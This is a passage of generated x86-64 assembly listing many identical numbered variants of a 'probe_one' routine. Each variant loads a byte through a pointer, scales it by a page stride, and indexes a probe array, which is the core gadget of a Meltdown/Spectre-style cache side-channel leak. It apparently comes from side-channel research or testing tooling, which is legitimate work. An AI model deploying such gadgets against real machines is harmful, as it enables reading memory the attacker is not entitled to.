	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 698
.Lprobe_one_win0_var698:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 699
.Lprobe_one_win0_var699:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 700
.Lprobe_one_win0_var700:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 701
.Lprobe_one_win0_var701:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 702
.Lprobe_one_win0_var702:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 703
.Lprobe_one_win0_var703:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 704
.Lprobe_one_win0_var704:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 705
.Lprobe_one_win0_var705:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 706
.Lprobe_one_win0_var706:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 707
.Lprobe_one_win0_var707:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 708
.Lprobe_one_win0_var708:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 709
.Lprobe_one_win0_var709:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 710
.Lprobe_one_win0_var710:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 711
.Lprobe_one_win0_var711:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 712
.Lprobe_one_win0_var712:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 713
.Lprobe_one_win0_var713:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 714
.Lprobe_one_win0_var714:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 715
.Lprobe_one_win0_var715:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 716
.Lprobe_one_win0_var716:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 717
.Lprobe_one_win0_var717:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 718
.Lprobe_one_win0_var718:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 719
.Lprobe_one_win0_var719:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 720
.Lprobe_one_win0_var720:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 721
.Lprobe_one_win0_var721:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 722
.Lprobe_one_win0_var722:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 723
.Lprobe_one_win0_var723:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 724
.Lprobe_one_win0_var724:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 725
.Lprobe_one_win0_var725:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 726
.Lprobe_one_win0_var726:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 727
.Lprobe_one_win0_var727:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 728
.Lprobe_one_win0_var728:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 729
.Lprobe_one_win0_var729:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 730
.Lprobe_one_win0_var730:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 731
.Lprobe_one_win0_var731:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 732
.Lprobe_one_win0_var732:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 733
.Lprobe_one_win0_var733:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 734
.Lprobe_one_win0_var734:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 735
.Lprobe_one_win0_var735:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 736
.Lprobe_one_win0_var736:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 737
.Lprobe_one_win0_var737:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 738
.Lprobe_one_win0_var738:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 739
.Lprobe_one_win0_var739:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 740
.Lprobe_one_win0_var740:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 741
.Lprobe_one_win0_var741:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 742
.Lprobe_one_win0_var742:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 743
.Lprobe_one_win0_var743:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 744
.Lprobe_one_win0_var744:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 745
.Lprobe_one_win0_var745:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 746
.Lprobe_one_win0_var746:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 747
.Lprobe_one_win0_var747:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 748
.Lprobe_one_win0_var748:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 749
.Lprobe_one_win0_var749:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 750
.Lprobe_one_win0_var750:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 751
.Lprobe_one_win0_var751:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 752
.Lprobe_one_win0_var752:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 753
.Lprobe_one_win0_var753:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 754
.Lprobe_one_win0_var754:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 755
.Lprobe_one_win0_var755:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 756
.Lprobe_one_win0_var756:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 757
.Lprobe_one_win0_var757:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 758
.Lprobe_one_win0_var758:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 759
.Lprobe_one_win0_var759:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 760
.Lprobe_one_win0_var760:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 761
.Lprobe_one_win0_var761:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 762
.Lprobe_one_win0_var762:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 763
.Lprobe_one_win0_var763:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 764
.Lprobe_one_win0_var764:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 765
.Lprobe_one_win0_var765:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 766
.Lprobe_one_win0_var766:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 767
.Lprobe_one_win0_var767:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 768
.Lprobe_one_win0_var768:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 769
.Lprobe_one_win0_var769:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 770
.Lprobe_one_win0_var770:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 771
.Lprobe_one_win0_var771:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 772
.Lprobe_one_win0_var772:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 773
.Lprobe_one_win0_var773:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 774
.Lprobe_one_win0_var774:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 775
.Lprobe_one_win0_var775:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 776
.Lprobe_one_win0_var776:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 777
.Lprobe_one_win0_var777:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 778
.Lprobe_one_win0_var778:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 779
.Lprobe_one_win0_var779:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 780
.Lprobe_one_win0_var780:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 781
.Lprobe_one_win0_var781:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 782
.Lprobe_one_win0_var782:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 783
.Lprobe_one_win0_var783:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 784
.Lprobe_one_win0_var784:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 785
.Lprobe_one_win0_var785:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 786
.Lprobe_one_win0_var786:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
